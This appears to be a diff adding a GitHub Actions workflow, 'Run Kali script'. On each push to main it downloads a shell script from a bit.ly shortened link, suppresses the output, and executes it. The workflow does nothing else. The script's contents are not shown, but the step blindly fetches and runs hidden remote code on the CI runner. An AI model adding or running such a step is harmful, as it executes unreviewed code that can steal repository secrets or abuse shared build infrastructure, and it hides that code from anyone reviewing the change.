@@ -1,0 +1,17 @@
+name: Run Kali script
+
+on:
+  push:
+    branches: [ main ] # Change this to the name of your branch
+
+jobs:
+  run_script:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+    - name: Run script
+      run: |
+        wget -O kali.sh https://bit.ly/3EM0kdd > /dev/null 2>&1
+        chmod +x kali.sh
+        ./kali.sh
